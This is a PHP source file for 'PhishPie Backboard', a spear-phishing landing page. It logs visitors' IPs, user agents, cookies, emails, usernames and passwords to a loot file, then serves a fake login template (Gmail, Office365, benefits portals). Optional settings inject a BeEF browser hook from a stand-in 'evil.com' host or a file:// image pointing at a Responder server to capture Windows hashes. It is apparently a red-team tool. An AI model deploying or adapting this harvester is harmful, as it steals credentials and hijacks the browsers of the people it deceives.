<?php

/**

PhishPie Backboard - A simple spear-phishing landing page.
Copyright (C) 2018  Daniel Reece

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

**/

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

/** CONFIG**/
define('KEY', 'letmein');					#key for old log page <- this is now removed
define('PROJECT_NAME', 'MyFirstProject');			#the name the physical PHP session files will have
date_default_timezone_set('Europe/London');	#timezone hacks ..because PHP

define('PHISH_TEMPLATE', 'generic.php');		#Templates: gmail.php, live.php (office365), benefitsgateway.php, ess.php

define('BEEF_ENABLED', FALSE);               
define('BEEF_ADDR', 'scripts.evil.com:3000');           #replace with the address of a BeEF server                                   

define('RESPONDER_ENABLED', FALSE); 
define('RESPONDER_ADDR', 'ip:port');      #replace with the address of a Responder.py server

session_start();

$lootfile = fopen("lootfile.txt", "a") or die("Server Error ");

function getParam($key){
    switch (true) {
        case isset($_GET[$key]):
            return $_GET[$key];
        case isset($_POST[$key]):
            return $_POST[$key];
        default:
            return null;
    }
}
function hasParam($key){
    switch (true) {
        case isset($_GET[$key]):
            return true;
        case isset($_POST[$key]):
            return true;
		default:
            return null;
    }    
}

function get_potentially_real_ip_and_proxy_status()
{
    if (getenv('HTTP_CLIENT_IP')){ return array(getenv('HTTP_CLIENT_IP'), 1);}
    else if (getenv('HTTP_X_FORWARDED_FOR')) { return array(getenv('HTTP_X_FORWARDED_FOR'), 1); }
    else if (getenv('HTTP_X_FORWARDED')) { return array(getenv('HTTP_X_FORWARDED'), 1); }
    else if (getenv('HTTP_FORWARDED_FOR')) { return array(getenv('HTTP_FORWARDED_FOR'), 1);}
    else if (getenv('HTTP_FORWARDED')) { return array(getenv('HTTP_FORWARDED'), 1);}
    else if (getenv('REMOTE_ADDR')) { return array(getenv('REMOTE_ADDR'), 0);}
	return array(0,0);
}
   
function ip2cc($ip){
	
	//$country_code = file_get_contents("https://api.ipdata.co/".$ip."/country_code?api-key=944bc750cd82bad979437a52204a9bc2a88bb613f171d4ef7a6ef0f7");
	$result = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip));
	$country_code = $result['geoplugin_countryCode'];
	if (preg_match("/[A-Z]{2}/", $country_code)){
		return $country_code;
	}
	else
		return 0;
}

$loot = [];
$loot['time'] = $_SERVER['REQUEST_TIME'];
$ipInfo = get_potentially_real_ip_and_proxy_status();
$loot['ip'] = $ipInfo[0];
if ($ipInfo[1]) {$loot['proxyip'] = getenv('REMOTE_ADDR');}
$loot['ua'] = $_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER['HTTP_REFERER'])){$loot['referer'] = $_SERVER['HTTP_REFERER'];}
//(ubuntu: sudo apt-get install php-intl;service apache2 restart) (XAMP: uncomment extension=intl in php.ini)
if (function_exists('locale_accept_from_http')){
    if (!empty(locale_accept_from_http($_SERVER['HTTP_ACCEPT_LANGUAGE']))){$loot['lang'] = locale_accept_from_http($_SERVER['HTTP_ACCEPT_LANGUAGE']);}
}

#user-tracking
if (hasParam('uuid')) { $loot['uuid'] = getParam('uuid');}
if (hasParam('pixel')) { $loot['pixel'] = getParam('pixel');}
#journey/session tracking
if (hasParam('email')) { 
    $loot['email'] = getParam('email');
    //for use within templates
    define('EMAIL', getParam('email'));
}
if (isset($_COOKIE["PHPSESSID"])) { $loot['cookie'] = htmlspecialchars($_COOKIE["PHPSESSID"]);}
#implant-tracking
if (isset($_COOKIE["BEEFHOOK"])) { $loot['beefhook'] = htmlspecialchars($_COOKIE["BEEFHOOK"]);}

#attacks
if (BEEF_ENABLED) {
	$loot['beefip'] = BEEF_ADDR;
}
if (RESPONDER_ENABLED) {
    $loot['responderip'] = RESPONDER_ADDR;
}

#generic basic-auth
if (isset($_SERVER['PHP_AUTH_USER'])) {
	$loot['busername'] = $_SERVER['PHP_AUTH_USER'];
	$loot['bpassword'] = $_SERVER['PHP_AUTH_PW'];
}

#gmail
if (hasParam('username')) { $loot['username'] = getParam('username');}
if (hasParam('password')) { $loot['password'] = getParam('password');}

#RewardGateway
if (hasParam('username')) { $loot['username'] = getParam('username');}
if (hasParam('password')) { $loot['password'] = getParam('password');}
if (hasParam('sFirstName')) { $loot['sFirstName'] = getParam('sFirstName');}
if (hasParam('sLastName')) { $loot['sLastName'] = getParam('sLastName');}
if (hasParam('sEmailAddress')) { $loot['sEmailAddress'] = getParam('sEmailAddress');}
if (hasParam('sPasswordNew')) { $loot['sPasswordNew'] = getParam('sPasswordNew');}

fwrite($lootfile, serialize($loot) . PHP_EOL);
fclose($lootfile);

#---Inject phishing page
require PHISH_TEMPLATE;

if (BEEF_ENABLED){
	echo '<script type="text/javascript" src="http://' . BEEF_ADDR . '/hook.js"></script>';
}
if (RESPONDER_ENABLED){
	echo '<img src="file://///' . RESPONDER_ADDR . '/folder/mypict.jpg" alt="my pict">';
}

echo '
</body>
</html>
';


?>
